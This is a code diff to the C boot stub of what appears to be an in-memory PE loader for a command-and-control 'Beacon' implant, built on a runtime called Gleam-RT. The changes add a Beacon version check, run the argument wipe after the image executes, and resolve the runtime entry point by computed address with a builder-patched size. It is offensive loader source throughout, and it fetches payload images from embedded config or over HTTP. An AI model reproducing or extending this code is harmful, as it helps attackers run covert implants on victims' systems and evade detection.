@@ -1,12 +1,15 @@
 #include "c_types.h"
 #include "win_types.h"
 #include "lib_memory.h"
-#include "rel_addr.h"
 #include "pe_image.h"
+#include "rel_addr.h"
 #include "errno.h"
 #include "runtime.h"
 #include "pe_loader.h"
 #include "boot.h"
+
+static Runtime_M* initRuntime(void* boot, Runtime_Opts* opts);
+static uint32     pe_loader_size();
 
 static void* loadImage(Runtime_M* runtime);
 static void* loadImageFromEmbed(Runtime_M* runtime, byte* config);
@@ -16,7 +19,7 @@ static void* loadImageFromHTTP(Runtime_M* runtime, byte* config);
 errno Boot(void* ctx)
 {
     // initialize Gleam-RT for PE Loader
-    Runtime_M* runtime = InitRuntime(GetFuncAddr(&Boot), NULL);
+    Runtime_M* runtime = initRuntime(GetFuncAddr(&Boot), NULL);
     if (runtime == NULL)
     {
         return GetLastErrno();
@@ -25,11 +28,23 @@ errno Boot(void* ctx)
     // reserved context and extended arguments
     (void)ctx;
 
-    // initialize PE Loader
+    // initialize PE Loader and load image
+    uint32 version;
     PELoader_M* loader = NULL;
     errno err = NO_ERROR;
     for (;;)
     {
+        // check the Beacon version
+        if (!runtime->Argument.GetValue(ARG_ID_VERSION, &version, NULL))
+        {
+            err = ERR_NOT_FOUND_VERSION;
+            break;
+        }
+        if (version < 0x0400) // v4.0
+        {
+            err = ERR_UNSUPPORTED_VERSION;
+            break;
+        }
         // load PE Image, it cannot be empty
         void* image = loadImage(runtime);
         if (image == NULL)
@@ -59,11 +74,11 @@ errno Boot(void* ctx)
             break;
         }
         runtime->Memory.Free(image);
-        runtime->Argument.EraseAll();
         // initialize dll before start beacon
         err = loader->Execute();
         break;
     }
+    runtime->Argument.EraseAll();
     if (err != NO_ERROR || loader == NULL)
     {
         runtime->Core.Exit();
@@ -84,11 +99,6 @@ errno Boot(void* ctx)
     {
         err = eld;
     }
-    errno ere = runtime->Core.Exit();
-    if (ere != NO_ERROR && err == NO_ERROR)
-    {
-        err = ere;
-    }
     return err;
 }
 
@@ -101,7 +111,7 @@ static void* loadImage(Runtime_M* runtime)
         SetLastErrno(ERR_NOT_FOUND_PE_IMAGE);
         return NULL;
     }
-    if (size == 0)
+    if (config == NULL || size == 0)
     {
         SetLastErrno(ERR_EMPTY_PE_IMAGE_DATA);
         return NULL;
@@ -205,3 +215,22 @@ static void* loadImageFromHTTP(Runtime_M* runtime, byte* config)
     runtime->WinHTTP.FreeDLL();
     return resp.Body.buf;
 }
+
+static Runtime_M* initRuntime(void* boot, Runtime_Opts* opts)
+{
+    uintptr base = (uintptr)(GetFuncAddr(&InitPELoader));
+    uintptr addr = base + pe_loader_size();
+    typedef Runtime_M* (*InitRuntime_t)(void* boot, Runtime_Opts* opts);
+    InitRuntime_t init = (InitRuntime_t)addr;
+    return init(boot, opts);
+}
+
+#pragma optimize("", off)
+
+// the size will be replaced by builder or generator
+static uint32 pe_loader_size()
+{
+    return STUB_PE_LOADER_SIZE;
+}
+
+#pragma optimize("", on)
